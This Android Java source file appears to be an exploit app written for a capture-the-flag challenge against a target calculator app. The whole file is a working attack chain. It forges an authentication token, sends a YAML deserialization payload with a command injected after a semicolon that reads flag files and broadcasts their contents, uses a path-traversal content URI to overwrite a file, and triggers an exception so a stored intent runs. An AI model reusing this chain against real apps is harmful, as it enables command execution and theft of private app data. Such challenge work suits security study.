package com.qinquang.exploit;

import androidx.appcompat.app.AppCompatActivity;

import android.content.ComponentName;
import android.content.ContentValues;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import org.yaml.snakeyaml.Yaml;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.HashMap;
import java.util.Map;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "ExploitActivity";
    private static final String TARGET_PKG = "com.qinquang.calc";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button exploitButton = findViewById(R.id.exploit_button);
        exploitButton.setOnClickListener(v -> {
            try {
                triggerExploit();
                Toast.makeText(this, "Exploit triggered!", Toast.LENGTH_SHORT).show();
            } catch (Exception e) {
                Log.e(TAG, "Exploit failed", e);
                Toast.makeText(this, "Exploit failed: " + e.getMessage(), Toast.LENGTH_LONG).show();
            }
        });
    }

    private void triggerExploit() throws Exception {
        // 1. Generate the bridge_token
        String token = generateToken(TARGET_PKG);
        Log.d(TAG, "Generated Token: " + token);

        // 2. Craft the YAML payload to execute the command
        // The command reads the flag and sends it via a broadcast
        String command = "; cat /data/data/com.qinquang.calc/flag-*.txt | xargs -I {} am broadcast -a com.qinquang.calc.FLAG --es flag {}";
        String yamlPayload = "!!com.qinquang.calc.PingUtil [\"" + command + "\"]";
        Log.d(TAG, "YAML Payload: " + yamlPayload);

        // 3. Craft the inner Intent that writes the YAML payload to history.yml
        Intent origIntent = new Intent();
        origIntent.setComponent(new ComponentName(TARGET_PKG, "com.qinquang.calc.BridgeActivity"));
        origIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        
        // Set up the values for BridgeActivity check
        ContentValues bridgeValues = new ContentValues();
        bridgeValues.put("action", "write");
        bridgeValues.put("target", yamlPayload);
        origIntent.putExtra("bridge_values", bridgeValues);
        origIntent.putExtra("bridge_token", token);
        
        // Add the original intent that BridgeActivity will process
        Intent finalIntent = new Intent();
        finalIntent.setData(Uri.parse("content://com.qinquang.calc/..%2f..%2ffiles%2fhistory.yml"));
        finalIntent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
        origIntent.putExtra("origIntent", finalIntent);

        // 4. Convert to intent URI
        String fallbackIntentUri = origIntent.toUri(Intent.URI_INTENT_SCHEME);
        Log.d(TAG, "Fallback Intent URI: " + fallbackIntentUri);

        // 5. Step 1: Store the fallback intent
        String expression1 = "intent:" + fallbackIntentUri;
        String encodedExpression1 = URLEncoder.encode(expression1, StandardCharsets.UTF_8.name());
        Uri deeplinkUri1 = Uri.parse("qiangcalc://calculate?expression=" + encodedExpression1);
        Log.d(TAG, "Step 1 - Deeplink URI: " + deeplinkUri1);

        Intent exploitIntent1 = new Intent(Intent.ACTION_VIEW, deeplinkUri1);
        exploitIntent1.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(exploitIntent1);
        
        // Wait a bit for the first intent to be processed
        Thread.sleep(1000);
        
        // 6. Step 2: Trigger the exception with 1/0
        String expression2 = "1/0";
        String encodedExpression2 = URLEncoder.encode(expression2, StandardCharsets.UTF_8.name());
        Uri deeplinkUri2 = Uri.parse("qiangcalc://calculate?expression=" + encodedExpression2);
        Log.d(TAG, "Step 2 - Deeplink URI: " + deeplinkUri2);

        Intent exploitIntent2 = new Intent(Intent.ACTION_VIEW, deeplinkUri2);
        exploitIntent2.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(exploitIntent2);
    }

    private String generateToken(String packageName) throws NoSuchAlgorithmException {
        MessageDigest digest = MessageDigest.getInstance("SHA-256");
        byte[] hash = digest.digest(packageName.getBytes(StandardCharsets.UTF_8));
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < 8; i++) {
            sb.append(String.format("%02x", hash[i]));
        }
        return sb.toString();
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        // This is now primarily for local testing convenience, 
        // as the FlagReceiver handles the critical logging.
        if (intent != null && intent.hasExtra("flag")) {
            TextView flagTextView = findViewById(R.id.flag_textview);
            String flag = intent.getStringExtra("flag");
            flagTextView.setText("FLAG: " + flag);
        }
    }
}
